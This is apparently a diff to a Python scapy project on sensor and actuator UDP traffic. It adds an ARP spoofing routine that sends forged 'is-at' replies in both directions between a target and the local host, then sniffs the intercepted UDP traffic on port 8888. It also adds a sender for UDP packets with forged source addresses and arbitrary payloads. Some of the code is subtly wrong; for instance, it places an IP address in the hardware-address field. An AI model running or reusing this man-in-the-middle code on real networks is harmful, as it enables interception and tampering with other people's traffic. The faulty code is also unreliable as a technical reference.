@@ -3,7 +3,8 @@ import socket
 import time
 from helpers import get_interface_name, parse_command, get_config_size
 import scapy.all as scapy
-
+import subprocess 
+import re
 
  
 
@@ -30,45 +31,46 @@ class network:
         self.IP = input
 
 
-    #function to "listen" 
-    def listen(self): 
-        while True: 
-            pass
-        
+
 
     #Uses scapy library to send fake package from 
-    def send_packet(self, dst_IP, dst_port):
+    def send_packet(self, dst_IP, dst_port,payload):
         ip = scapy.IP(src = self.IP, dst = dst_IP)
         udp = scapy.UDP(sport=self.UDP_PORT, dport=dst_port)
-        payload = "Hello UDP!!"
+    
 
         scapy.send(ip/udp/payload)
 
 
-
-
 class sniffer: 
 
+
+
     def __init__(self): 
+        self.udp_packets = []
         self.actuator_packets = []
         self.sensor_packets = []
+        self.dest_ip = None
+  
+
+    def set_dest_ip(self, input): 
+        self.dest_ip = input
 
     def process_packet(self, packet): 
-        if packet.haslayer(scapy.IP) and packet.haslayer(scapy.UDP):
-            payload = packet[scapy.UDP].payload
-            if len(payload) >= 2:
-                
-  
-             two_byte_array = payload.load[0:1]
-             binary_representation = ''.join(format(byte, '08b') for byte in two_byte_array)
-
-             print(binary_representation)
-
-               
-
-    def show_packet(self, packet): 
         print(packet.summary())
+    
+        
+    def fake_out(self, target, spoof): 
+        #hwdst = is the local adddress since the spoofing occurs at a local level
+        response = scapy.ARP(pdst = target, hwdst = '127.0.0.1', psrc= spoof, op = 'is-at')
+        scapy.send(response, verbose=False)
+        return True 
+    
 
+    def start_fake_out(self):
+        print("Starting ARP spoofing on destination IP.")
+        self.fake_out(self.dest_ip, '127.0.0.1')  # Spoofing self as destination
+        self.fake_out('127.0.0.1', self.dest_ip)  # Spoofing destination as self
 
 
     def split_paths(self, data): 
@@ -78,6 +80,17 @@ class sniffer:
         else: 
             self.sensor_packets.append(data)
 
-    def begin_sniffing(self, command): 
-        scapy.sniff(count = get_config_size(command), prn=self.process_packet, store=False)
+    def begin_sniffing(self):
+        # Ensure ARP spoofing is set up
+        if not (self.fake_out('127.0.0.1', self.dest_ip)) or not (self.fake_out(self.dest_ip,'127.0.0.1')): 
+            print("ARP sequence failed, exiting.")
+            return 
 
+        # Begin sniffing with a filter for UDP traffic on port 8888
+        print(f"Beginning to sniff from {self.dest_ip} on port 8888.")
+        filter_str = 'udp and port 8888'
+
+        scapy.sniff(filter=filter_str, prn=self.process_packet, store=False)
+
+
+        
